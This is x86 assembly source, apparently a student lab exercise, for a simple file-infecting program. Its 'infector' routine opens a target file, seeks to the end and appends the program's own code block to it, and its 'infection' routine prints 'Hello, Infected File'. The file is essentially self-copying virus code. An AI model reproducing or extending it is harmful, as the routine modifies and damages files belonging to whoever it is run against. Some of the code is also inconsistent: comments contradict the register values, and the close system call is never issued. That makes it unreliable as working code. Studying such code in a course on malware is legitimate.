section .data
msg: db "Hello, Infected File",10,0 ;this is our message
fmt: db "the address is: ",10,0 ;this is our message
section .bss

fd_out: resw 1

section .text
global _start
global system_call
global code_start
global code_end
global infector
global infection
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:

infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state

   mov eax, 4
   mov ebx, 1
   mov ecx, msg
   mov edx, 21
   int     0x80            ; Transfer control to operating system
   jmp code_end

infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad                  ; Save some more caller state
   ; open the file
   mov     eax, 5          ; sys_open()
   mov     ebx, [ebp+8]    ; Copy function args to registers: leftmost...  
   mov     ecx, 0x1001       ;not sure!
   mov     edx,0777
   int     0x80            ; Transfer control to operating system

   mov [fd_out], eax       ;save file descriptor

  ;move to end of file
   mov     eax, 19          ; sys_lseek()
   mov     ebx, [fd_out]    ; file descriptor
   mov     ecx, 1           ; move 0 bytes
   mov     edx,2            ; from the end of file
   int     0x80             ; Transfer control to operating system


   ; write into the file
   mov  edx,code_end-code_start  ;amount of bytes
   mov  ecx, code_start          ;message to write
   mov  ebx, [fd_out]            ;file descriptor 
   mov  eax,4                    ;system call number (sys_write)
   int  0x80                     ;call kernel
    
   ; close the file
   mov eax, 6
   mov ebx, [fd_out]

code_end:
   popad                   ; Restore caller state (registers)
   mov     esp, ebp
   pop     ebp             ; Restore caller state
   ret                     ; Back to caller

  